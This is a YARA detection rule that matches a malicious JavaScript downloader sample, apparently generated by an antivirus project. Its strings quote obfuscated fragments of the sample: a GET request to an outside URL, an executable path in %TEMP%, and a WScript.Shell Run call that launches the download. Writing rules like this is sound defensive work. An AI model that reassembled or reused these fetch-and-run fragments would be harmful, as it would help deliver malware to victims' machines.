rule sig_20160328_01526831fb4d674fc45aeebe8b37bb8b {
  meta:
    description = "datamaliciousorder - file 20160328_01526831fb4d674fc45aeebe8b37bb8b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "61b6db80f7c653726959bf15182e04b94f96914fc6f3bac06b7168fcf99aeef2"

  strings:
    $s1  = "function Vvqkbu() {return Xepwxjnkw[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"i4kSiaHj.exe\";};" fullword ascii
    $s2  = "do {WScript[Klconzv](Fmcmdr() * 11)} while (Dyojjx[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Xepwxjnkw = function Paujsdsbls() {return WScript[Nlcodu](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Iurvgzw(Hbzghmrvax, Lmpjrfnp){return Hbzghmrvax - Lmpjrfnp;};" fullword ascii
    $s5  = "Dyojjx[Qccfc](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s6  = "function Fmcmdr(){return 22;};" fullword ascii
    $s7  = "function Tqtor() {return ((Vlovaz == true) && (Vlovaz == Oufzboxpl)) ? 1 : Grdmch;};" fullword ascii
    $s8  = "function Hczsd(Htljcyvr){Xepwxjnkw[\"Run\"](Htljcyvr, Grdmch, Grdmch);};" fullword ascii
    $s9  = "function Jilys(Jahhj) {var Uwfzv = (1, 2, 3, 4, 5, Jahhj); return Uwfzv;};" fullword ascii
    $s10 = "function Hmrslip()" fullword ascii
    $s11 = "function Ezdjxhs(){return Nlcodu;};" fullword ascii
    $s12 = "var Rpkzme = false;" fullword ascii
    $s13 = "var Anuduob = new this[\"Date\"]();" fullword ascii
    $s14 = "var Oufzboxpl = false;" fullword ascii
    $s15 = "var Vlovaz = false;" fullword ascii
    $s16 = "function Kwkmad(){return Lexcitcuju;};" fullword ascii
    $s17 = "return Iurvgzw(Dhsedta, Sptdevvp);" fullword ascii
    $s18 = " while (Kqciyi){" fullword ascii
    $s19 = "Vlovaz = true; " fullword ascii
    $s20 = "Oufzboxpl = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}